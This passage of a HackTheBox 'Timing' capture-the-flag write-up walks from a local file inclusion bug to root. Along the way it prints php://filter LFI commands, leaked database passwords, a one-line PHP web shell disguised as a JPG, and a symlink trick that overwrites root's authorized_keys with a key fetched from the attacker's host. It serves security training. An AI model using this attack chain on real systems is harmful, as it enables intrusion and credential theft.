+*Successful LFI of /etc/passwd.*
+
+### First Login
+
+Seeing the user aaron in /etc/passwd, we can try aaron as a username and password on the login page. This simple attempt worked!
+
+![Logging in as aaron.](/writeups/hackthebox-timing-write-up/img-6.png)
+
+*Logging in as aaron.*
+
+We are now logged in as aaron.
+
+![Successfully logged in as aaron.](/writeups/hackthebox-timing-write-up/img-7.png)
+
+*Successfully logged in as aaron.*
+
+### More LFI
+
+Even logged in as aaron, we still don't have an obvious way to achieve code execution. However, we can still make use of the LFI vulnerability to view the source code of all of the PHP pages now.
+
+### login.php
+
+login.php points us to db\_conn.php which might contain a password for the database.
+
+```
+# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=login.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2764  100  2764    0     0  25005      0 --:--:-- --:--:-- --:--:-- 25127
+<?php
+```
+
+```
+include "header.php";
+```
+
+```
+function createTimeChannel()
+{
+    sleep(1);
+}
+```
+
+```
+include "db_conn.php";
+```
+
+### db\_conn.php
+
+db\_conn.php reveals a password! Unfortunately, this password doesn't seem to work anywhere else that we know of and we can't access the DB.
+
+```
+# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   124  100   124    0     0   1246      0 --:--:-- --:--:-- --:--:--  1252
+<?php
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
+```
+
+### upload.php
+
+upload.php is another PHP page to check. It shows that the page admin\_auth\_check.php is included first and then some other operations are done for file uploads. This information will be useful later.
+
+```
+# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1360  100  1360    0     0  14023      0 --:--:-- --:--:-- --:--:-- 14166
+<?php
+include("admin_auth_check.php");
+```
+
+```
+$upload_dir = "images/uploads/";
+```
+
+```
+if (!file_exists($upload_dir)) {
+    mkdir($upload_dir, 0777, true);
+}
+```
+
+```
+$file_hash = uniqid();
+```
+
+```
+$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
+$target_file = $upload_dir . $file_name;
+$error = "";
+$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+```
+
+```
+if (isset($_POST["submit"])) {
+    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+    if ($check === false) {
+        $error = "Invalid file";
+    }
+}
+```
+
+```
+// Check if file already exists
+if (file_exists($target_file)) {
+    $error = "Sorry, file already exists.";
+}
+```
+
+```
+if ($imageFileType != "jpg") {
+    $error = "This extension is not allowed.";
+}
+```
+
+```
+if (empty($error)) {
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+        echo "The file has been uploaded.";
+    } else {
+        echo "Error: There was an error uploading your file.";
+    }
+} else {
+    echo "Error: " . $error;
+}
+?>
+```
+
+### admin\_auth\_check.php
+
+admin\_auth\_check.php finally looks like the key to the next step. It suggests that our user profile must have a role parameter set to 1 in order to pass as an admin.
+
+```
+# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   268  100   268    0     0   2627      0 --:--:-- --:--:-- --:--:--  2653
+<?php
+include_once "auth_check.php";
+```
+
+```
+if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
+    echo "No permission to access this panel!";
+    header('Location: ./index.php');
+    die();
+}
+?>
+```
+
+### Set Role to Admin
+
+Logged in as aaron, we can edit our profile which sends a few parameters to the server about our user.
+
+![Editing the profile of aaron.](/writeups/hackthebox-timing-write-up/img-8.png)
+
+*Editing the profile of aaron.*
+
+Let’s intercept an update to the profile in Burp Suite. We can see the parameters passed in the POST request. If we add another parameter for role=1, this should make us an admin.
+
+![Adding role=1 to the intercepted aaron profile edit request.](/writeups/hackthebox-timing-write-up/img-9.png)
+
+*Adding role=1 to the intercepted aaron profile edit request.*
+
+After forwarding the new POST request from Burp and refreshing the page, we have a new page available labeled as “Admin Panel”. This page makes use of the upload.php page we analyzed via LFI previously.
+
+![Refreshing to see aaron is now an admin.](/writeups/hackthebox-timing-write-up/img-10.png)
+
+*Refreshing to see aaron is now an admin.*
+
+### Analyzing upload.php
+
+The key part to analyze within upload.php is below. It requires a JPG file to be uploaded which gets saved to /images/uploads/ on the server. However, first it renames our file to an MD5 hash of '$file\_hash' concatenated with the current time. This MD5 hash then gets concatenated with the original name of our file for upload.
+
+```
+$upload_dir = "images/uploads/";
+```
+
+```
+if (!file_exists($upload_dir)) {
+    mkdir($upload_dir, 0777, true);
+}
+```
+
+```
+$file_hash = uniqid();
+```
+
+```
+$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
+$target_file = $upload_dir . $file_name;
+$error = "";
+$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+```
+
+```
+----- SNIP -----
+```
+
+```
+if ($imageFileType != "jpg") {
+    $error = "This extension is not allowed.";
+}
+```
+
+We should be able to bypass the JPG check by simply renaming our own PHP code to a JPG extension. We can then reverse engineer the time-based MD5 hashing to find the correct file name uploaded on the server to make use of our PHP code. It’s also important to note that the $file\_hash variable within the MD5 function is in single quotes and therefore will be interpreted as a string, rather than its assigned value which we would not know. We'll replicate this mistake and simply pass the string to our function as well. First, we make the JPG file containing a basic PHP web shell.
+
+```
+# cat shell.jpg
+<?php system($_GET[cmd]);?>
+```
+
+Next, we simply upload our JPG file containing the PHP web shell. It is accepted because it has a .jpg extension. Intercept this upload in Burp too.
+
+![Uploading PHP code as JPG file.](/writeups/hackthebox-timing-write-up/img-11.png)
+
+*Uploading PHP code as JPG file.*
+
+In Burp Suite, with the intercepted request, we can make the upload again and view the raw response from the server. This response contains the timestamp from the server which we will need to replicate the MD5 function and find our file.
+
+![Repeating the PHP/JPG file upload in Burp to see the server’s timestamp.](/writeups/hackthebox-timing-write-up/img-12.png)
+
+*Repeating the PHP/JPG file upload in Burp to see the server’s timestamp.*
+
+Taking the time from Burp response from the server, we can convert it to Epoch time to be used in PHP. Using this we can then complete the concatenation with the other string to generate the MD5 hash that will match our uploaded file.
+
+```
+php > echo strtotime("Sat, 04 Jun 2022 19:27:26 GMT");
+1654370846
+php > echo md5('$file_hash' . strtotime("Sat, 04 Jun 2022 19:27:26 GMT"));
+e22d7578e888915a1d5901f78f6cdca5
+```
+
+Now, using this MD5 hash, the concatenated underscore and our known file name, in addition to the LFI vulnerability used before, we can execute our PHP code on the server. A simple ls command shows that it works!
+
+![Successful code execution using our PHP code.](/writeups/hackthebox-timing-write-up/img-13.png)
+
+*Successful code execution using our PHP code.*
+
+### Reverse Shell
+
+After trying many different types of reverse shells in the code execution, it seems that a firewall is blocking all outbound connections. We’ll need to find another way through enumeration. After a while, I found a source-files-backup.zip file in /opt on the system.
+
+![Finding source-files-backup.zip on the server.](/writeups/hackthebox-timing-write-up/img-14.png)
+
+*Finding source-files-backup.zip on the server.*
+
+To download this ZIP file, I copied it to the root of the webserver /var/www/html and downloaded it. Unzipping it shows a .git directory. Because this is a backup of the website, there may be some git history of some old passwords or other information in these files. Performing a git log shows commit history, and then viewing the specific commit for an update to the db\_conn file shows that there is an old password!
+
+```
+# git log
+commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
+Author: grumpy <grumpy@localhost.com>
+Date:   Tue Jul 20 22:34:13 2021 +0000
+```
+
+```
+    db_conn updated
+```
+
+```
+# git show 16de2698b5b122c93461298eab730d00273bd83e
+commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
+Author: grumpy <grumpy@localhost.com>
+Date:   Tue Jul 20 22:34:13 2021 +0000
+```
+
+```
+    db_conn updated
+```
+
+```
+diff --git a/db_conn.php b/db_conn.php
+index f1c9217..5397ffa 100644
+--- a/db_conn.php
++++ b/db_conn.php
+@@ -1,2 +1,2 @@
+ <?php
+-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
++$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
+```
+
+The other password didn’t work anywhere. Luckily in this case, the previous password of S3cr3t\_unGu3ss4bl3\_p422w0Rd was reused for SSH as aaron. We're in as a user and can grab the flag user.txt!
+
+![Successful SSH login as aaron.](/writeups/hackthebox-timing-write-up/img-15.png)
+
+*Successful SSH login as aaron.*
+
+## Enumeration
+
+### Sudo
+
+One of the first things to always try when enumerating for privilege escalation is sudo -l. In this case it shows us that we have permissions to run a netutils executable as root.
+
+```
+aaron@timing:~$ sudo -l
+Matching Defaults entries for aaron on timing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+```
+
+```
+User aaron may run the following commands on timing:
+    (ALL) NOPASSWD: /usr/bin/netutils
+```
+
+### Netutils
+
+Inside netutils we can see it runs a Java executable located in the root directory.
+
+```
+aaron@timing:~$ cat /usr/bin/netutils
+#! /bin/bash
+java -jar /root/netutils.jar
+```
+
+Running netutils with sudo, we can see an HTTP option that saves a remote file to aaron's home directory.
+
+```
+aaron@timing:~$ sudo netutils
+netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit
+Input >> 1
+Enter Url: http://10.10.14.4/test.txt
+Initializing download: http://10.10.14.4/test.txt
+File size: unavailable
+Opening output file test.txt
+Server unsupported, starting from scratch with one connection.
+Starting download
+```
+
+```
+Connection 0 finished
+```
+
+````
+Downloaded 0 byte in 0 seconds. (0.00 KB/s)
+```
+````
+
+## Root
+
+There are some creative ways to take advantage of writing this file as root, but one way is to add an SSH key to the root user with a symbolic link. If we set up a symlink in aaron's home directory pointing to root's authorized\_keys file, then run the netutils application and we can overwrite it as root containing our own SSH public key. First, we set up the symlink named keys.
+
+```
+aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys
+aaron@timing:~$ ls -al
+total 36
+drwxr-x--x 5 aaron aaron 4096 Jun  4 19:53 .
+drwxr-xr-x 3 root  root  4096 Dec  2  2021 ..
+lrwxrwxrwx 1 root  root     9 Oct  5  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc
+drwx------ 2 aaron aaron 4096 Nov 29  2021 .cache
+drwx------ 3 aaron aaron 4096 Nov 29  2021 .gnupg
+lrwxrwxrwx 1 aaron aaron   26 Jun  4 19:53 keys -> /root/.ssh/authorized_keys
+```
+
+Now, on our attacking host, we can generate an SSH key pair, copy and stage the public key with the same name as the symlink, and host it on a webserver.
+
+![Generating SSH key, renaming and moving it, and hosting it on a webserver.](/writeups/hackthebox-timing-write-up/img-16.png)
+
+*Generating SSH key, renaming and moving it, and hosting it on a webserver.*
+
+Finally, running the netutils application and specifying our public key on our webserver to grab, it downloads it and overwrites the root user's authorized\_keys file through the symbolic link. Remember, we're able to do this because we can run netutils through sudo.
+
+```
+aaron@timing:~$ sudo netutils
+netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit
+Input >> 1
+Enter Url: http://10.10.14.4/keys
+Initializing download: http://10.10.14.4/keys
+File size: 563 bytes
+Opening output file keys
+Server unsupported, starting from scratch with one connection.
+Starting download
+Downloaded 563 byte in 0 seconds. (2.75 KB/s)
+```
+
+Now, with our public SSH key configured for root and our private key already generated and on our host, we can simply SSH to the box as root! We escalated to root and can grab the root.txt flag!
+
+![Successful SSH login as root.](/writeups/hackthebox-timing-write-up/img-17.png)
+
+*Successful SSH login as root.*
+
+## Loot
+
+Other than the points on HackTheBox, the lessons learned are the real treasures for this box.
+
+1.  One issue I ran into along the way that I did not cover in the write-up was my first attempt at reversing the time-based MD5 function. I first attempted to generate the MD5 hash using Python because I am comfortable with it. However, this caused issues because the Python time function generates Epoch time with milliseconds in a different format, resulting in a different MD5. The lesson learned was to perform the reverse engineering in the same language that the original code was in (PHP) to avoid these unexpected issues.
+2.  Simple vulnerabilities/exploits used earlier in your attack chain can prove to be very useful later in the chain. In this case, we ended up using that same LFI vulnerability from the very beginning all the way to the point where we had to use it to execute our custom PHP code on the server.
+
+Thank you for reading my write-up for the Timing machine on HackTheBox. Be sure to check out my other write-ups for [HackTheBox](/notes?tag=hackthebox)!
